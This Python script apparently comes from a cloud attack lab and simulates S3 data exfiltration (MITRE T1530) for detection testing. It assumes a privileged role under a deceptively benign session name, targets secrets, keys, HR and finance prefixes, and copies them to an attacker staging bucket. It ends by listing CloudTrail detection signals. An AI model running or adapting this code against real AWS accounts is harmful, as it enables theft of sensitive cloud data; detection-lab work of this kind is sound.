#!/usr/bin/env python3
"""
S3 Data Exfiltration Simulation
MITRE ATT&CK: T1530 - Data from Cloud Storage

Simulates an attacker who has obtained valid AWS credentials and
systematically exfiltrates data from a target S3 bucket to an
attacker-controlled staging bucket.

Attack phases:
  1. Discovery    — enumerate accessible buckets and identify target
  2. Collection   — list objects in target bucket, identify sensitive files
  3. Exfiltration — copy objects to attacker-controlled staging bucket
  4. Staging      — verify exfiltrated data in staging bucket

CloudTrail events generated:
  - ListBuckets          (discovery)
  - ListObjectsV2        (collection)
  - GetObject            (exfiltration read)
  - PutObject            (exfiltration write to staging)
  - ListObjectsV2        (staging verification)

Usage:
  export AWS_ACCOUNT_ID=<your-account-id>
  export TARGET_BUCKET=cloud-attack-lab-target-data-<account-id>
  export EXFIL_BUCKET=cloud-attack-lab-exfil-staging-<account-id>
  source .venv/bin/activate
  python attack-simulation/s3_exfil.py
"""

import boto3
import os
import json
from datetime import datetime, timezone
from botocore.exceptions import ClientError

# ── Configuration ────────────────────────────────────────────────────────────
AWS_ACCOUNT_ID = os.environ.get("AWS_ACCOUNT_ID")
TARGET_BUCKET  = os.environ.get("TARGET_BUCKET")
EXFIL_BUCKET   = os.environ.get("EXFIL_BUCKET")
ATTACKER_PROFILE = "lab-attacker"

# Sensitive path prefixes to prioritize during collection
SENSITIVE_PATHS = ["config/", "finance/", "hr/", "secrets/", "keys/", "backup/"]

def banner(msg):
    print(f"\n{'='*60}")
    print(f"  {msg}")
    print(f"{'='*60}")

def phase(msg):
    print(f"\n[*] {msg}")

def success(msg):
    print(f"[+] {msg}")

def info(msg):
    print(f"    {msg}")

def main():
    if not all([AWS_ACCOUNT_ID, TARGET_BUCKET, EXFIL_BUCKET]):
        print("[!] Missing required environment variables.")
        print("    Export: AWS_ACCOUNT_ID, TARGET_BUCKET, EXFIL_BUCKET")
        raise SystemExit(1)

    banner(f"S3 Data Exfiltration Simulation\n  MITRE ATT&CK: T1530\n  Time: {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}")

    # ── Session setup ─────────────────────────────────────────────────────────
    session = boto3.Session(profile_name=ATTACKER_PROFILE)

    # Phase 1 — assume the privileged role (same chain as credential_theft)
    # In a real attack, attacker already has these credentials from prior steps.
    # Here we use the attacker IAM user directly since it has the target bucket
    # access via the privileged role assumption.
    sts = session.client("sts", region_name="us-east-1")

    phase("Phase 1 — Privilege Escalation (AssumeRole)")
    role_arn = f"arn:aws:iam::{AWS_ACCOUNT_ID}:role/cloud-attack-lab-privileged-role"
    info(f"Target role: {role_arn}")

    try:
        resp = sts.assume_role(
            RoleArn=role_arn,
            RoleSessionName="backup-restore-session",  # benign-sounding session name
            DurationSeconds=3600
        )
        creds = resp["Credentials"]
        success(f"Role assumption successful")
        info(f"Session: {resp['AssumedRoleUser']['Arn']}")
        info(f"Key prefix: {creds['AccessKeyId'][:8]}... (ASIA = temporary STS)")
        info(f"Expires: {creds['Expiration']}")
    except ClientError as e:
        print(f"[!] AssumeRole failed: {e}")
        raise SystemExit(1)

    # Build escalated S3 client using assumed role credentials
    s3 = boto3.client(
        "s3",
        region_name="us-east-1",
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"]
    )

    # ── Phase 2 — Discovery ───────────────────────────────────────────────────
    phase("Phase 2 — Bucket Discovery (T1530)")
    info("Verifying access to known target bucket...")
    info("(s3:ListAllMyBuckets not granted — attacker operates with prior knowledge)")

    try:
        # ListObjectsV2 with MaxKeys=0 is a lightweight way to confirm bucket
        # access without retrieving objects — generates a CloudTrail event
        s3.list_objects_v2(Bucket=TARGET_BUCKET, MaxKeys=1)
        success(f"Target bucket confirmed accessible: {TARGET_BUCKET}")
        success(f"Staging bucket: {EXFIL_BUCKET}")
    except ClientError as e:
        print(f"[!] Target bucket access check failed: {e}")
        raise SystemExit(1)

    # ── Phase 3 — Collection ──────────────────────────────────────────────────
    phase("Phase 3 — Object Enumeration and Triage (T1530)")
    info(f"Listing objects in target bucket: {TARGET_BUCKET}")

    try:
        paginator = s3.get_paginator("list_objects_v2")
        all_objects = []
        for page in paginator.paginate(Bucket=TARGET_BUCKET):
            all_objects.extend(page.get("Contents", []))
    except ClientError as e:
        print(f"[!] ListObjectsV2 failed: {e}")
        raise SystemExit(1)

    success(f"Found {len(all_objects)} objects")

    # Triage — prioritize sensitive paths
    high_value = [o for o in all_objects if any(o["Key"].startswith(p) for p in SENSITIVE_PATHS)]
    other = [o for o in all_objects if o not in high_value]

    info(f"High-value targets ({len(high_value)}):")
    for obj in high_value:
        info(f"  [HIGH] {obj['Key']} ({obj['Size']} bytes)")
    if other:
        info(f"Other objects ({len(other)}):")
        for obj in other:
            info(f"  [LOW]  {obj['Key']} ({obj['Size']} bytes)")

    # ── Phase 4 — Exfiltration ────────────────────────────────────────────────
    phase("Phase 4 — Exfiltration to Staging Bucket (T1530)")
    info(f"Copying high-value objects to staging: {EXFIL_BUCKET}")
    info("(GetObject from target + PutObject to staging = exfiltration chain)\n")

    exfil_manifest = []
    exfil_prefix = f"exfil-{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}/"

    for obj in high_value:
        key = obj["Key"]
        staging_key = f"{exfil_prefix}{key}"

        try:
            # GetObject — reads the data from target (T1530 signal 1)
            response = s3.get_object(Bucket=TARGET_BUCKET, Key=key)
            data = response["Body"].read()
            preview = data[:120].decode("utf-8", errors="replace").replace("\n", " ")

            # PutObject — writes to attacker staging bucket (T1530 signal 2)
            s3.put_object(
                Bucket=EXFIL_BUCKET,
                Key=staging_key,
                Body=data,
                Metadata={
                    "exfil-source-bucket": TARGET_BUCKET,
                    "exfil-source-key": key,
                    "exfil-timestamp": datetime.now(timezone.utc).isoformat()
                }
            )

            success(f"Exfiltrated: {key}")
            info(f"  Staging key : {staging_key}")
            info(f"  Size        : {len(data)} bytes")
            info(f"  Preview     : {preview[:80]}...")

            exfil_manifest.append({
                "source_bucket": TARGET_BUCKET,
                "source_key": key,
                "staging_bucket": EXFIL_BUCKET,
                "staging_key": staging_key,
                "size_bytes": len(data)
            })

        except ClientError as e:
            print(f"[!] Failed to exfiltrate {key}: {e}")

    # ── Phase 5 — Staging Verification ───────────────────────────────────────
    phase("Phase 5 — Verify Staging Bucket Contents")
    info(f"Listing exfiltrated objects in {EXFIL_BUCKET}...")

    try:
        staged = s3.list_objects_v2(Bucket=EXFIL_BUCKET, Prefix=exfil_prefix)
        objects = staged.get("Contents", [])
        success(f"Confirmed {len(objects)} objects in staging bucket")
        for obj in objects:
            info(f"  {obj['Key']} ({obj['Size']} bytes)")
    except ClientError as e:
        print(f"[!] Staging verification failed: {e}")

    # ── Summary ───────────────────────────────────────────────────────────────
    banner("Exfiltration Complete")
    print(f"\n  CloudTrail events generated:")
    print(f"    - AssumeRole            (T1078.004) — privilege escalation")
    print(f"    - ListObjectsV2         (T1530)     — target bucket access check")
    print(f"    - ListObjectsV2         (T1530)     — object enumeration x2")
    print(f"    - GetObject x{len(exfil_manifest)}            (T1530)     — data read")
    print(f"    - PutObject x{len(exfil_manifest)}            (T1530)     — data staged")
    print(f"\n  Detection signals:")
    print(f"    - AssumedRole identity performing GetObject on sensitive paths")
    print(f"    - GetObject + PutObject pair (read from target, write to staging)")
    print(f"    - PutObject to a bucket tagged 'attacker-controlled-destination'")
    print(f"    - All activity from single source IP in short time window")
    print(f"\n  Exfil manifest:")
    for item in exfil_manifest:
        print(f"    {item['source_key']} -> {item['staging_bucket']}/{item['staging_key']}")

if __name__ == "__main__":
    main()